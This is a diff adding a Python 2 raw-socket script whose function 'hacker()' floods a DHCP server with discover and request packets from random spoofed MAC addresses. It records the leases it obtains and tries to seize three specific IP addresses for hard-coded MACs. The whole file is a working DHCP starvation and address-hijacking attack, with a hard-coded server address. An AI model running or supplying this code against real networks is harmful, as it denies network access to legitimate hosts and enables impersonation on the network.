@@ -1,0 +1,122 @@
+#!/usr/bin/env python
+#encoding:UTF-8
+import socket
+import struct
+import time
+import random
+import signal
+import pickle
+import fcntl
+
+import send_packet
+
+ip_server='202.118.48.252'
+broad="\xff\xff\xff\xff\xff\xff"
+gw='\x00\x1a\xa9\x17\x83\xe5'
+master='\x44\x8a\x5b\xea\xb7\x25'
+node1='\x40\xa8\xf0\x01\xb2\x52'
+node2='\x44\x8a\x5b\xea\xb7\xea'
+
+des_eth=broad
+src_eth=""
+ip_src="0.0.0.0"
+ip_des="255.255.255.255"
+xid=""
+magic_cookie='\x63\x82\x53\x63'
+ip_request=""
+
+count=0
+
+ip_request0=send_packet.ip_format("222.26.28.250")
+ip_request1=send_packet.ip_format("222.26.28.251")
+ip_request2=send_packet.ip_format("222.26.28.252")
+ip_eth={ip_request0:master, ip_request1:node1, ip_request2:node2}
+
+rawSocket=socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
+rawSocket.bind(("eth0", socket.htons(0x0000)))
+
+def discover():
+    send_packet.discover_send(rawSocket, des_eth, src_eth, ip_src, ip_des, ip_request, xid, magic_cookie)
+
+def request():
+    send_packet.request_send(rawSocket, des_eth, src_eth, ip_src, ip_des, ip_request, xid, magic_cookie)
+
+def handler(signum, frame):
+    time.sleep(count*10)
+    raise AssertionError
+
+signal.signal(signal.SIGALRM, handler)
+
+def hacker():
+    global xid    
+    global ip_request
+    global src_eth
+
+    global ip_eth
+    global count
+
+    src_eth=send_packet.mac_format()
+    xid=send_packet.xid_format()
+    ip_request=send_packet.ip_rand()
+
+   
+    discover()
+    signal.alarm(10)
+
+    while True:
+        try:
+            recvData=rawSocket.recv(4096) 
+            if recvData[46:50]==xid:
+	        if recvData[284]=='\x02':
+                    print "get one offer"
+	    	    if recvData[30:34] in ip_eth:
+		        if ip_eth[recvData[30:34]]==src_eth:
+			    request()
+		        else:
+                            
+                            signal.alarm(0)
+                            
+			    ip_request=recvData[30:34]
+		            src_eth=ip_eth[ip_request]
+		            xid=send_packet.xid_format()
+			    discover()
+                            signal.alarm(10)
+		    else:
+		        if src_eth in ip_eth.values():
+			    print "...................error......................."
+			    break
+	      	        else:
+			    ip_request=recvData[30:34]
+			    request()
+
+                elif recvData[284]=='\x05':
+                    signal.alarm(0)
+		    print "............get one ack........................"
+                    if ip_request in ip_eth:
+		        del ip_eth[ip_request]
+		        print ".......... one host finished..................."
+                    else:
+		        print "........one mac..........have used............."    
+		        f=open("host_ip.dat", "ab")
+    		        fcntl.flock(f.fileno(), fcntl.LOCK_EX)
+                        pickle.dump((ip_request, src_eth, xid), f)
+		        f.close()
+		    count=count/2
+		    break
+	        else:
+		    print "...............not offer  and  not  ack ....  error"
+		    break
+	    else:
+	        continue
+        except AssertionError:
+	    count=count+1
+	    return 0
+
+
+if __name__=="__main__":
+    while True:
+        hacker()
+	if ip_eth=={}:
+            break
+	time.sleep(5)
+
